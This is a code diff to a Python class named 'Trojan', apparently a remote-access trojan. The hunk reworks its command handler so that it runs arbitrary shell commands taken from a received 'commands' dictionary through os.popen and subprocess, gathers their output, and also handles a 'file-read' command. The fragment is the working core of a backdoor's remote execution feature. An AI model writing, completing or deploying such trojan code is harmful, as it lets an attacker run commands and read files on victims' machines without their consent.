@@ -54,12 +54,13 @@ class Trojan:
         for key, values in commands.items():
             if key.lower() == 'cmd':
                 for cmd in values: #just keeps running seemingly random values
-                    output = str(os.popen(cmd).read())
-                    if output == -1 or output == 1:
-                        try:
-                            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
-                        except Exception as e:
-                            output = e
+                    try:
+                        output = str(os.popen(cmd).read())
+                    except:
+                            try:
+                                output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+                            except Exception as e:
+                                output = e
                     outcomes['cmd'].append([ cmd, output])
             elif key.lower() == 'file-read':
                 for value in values:
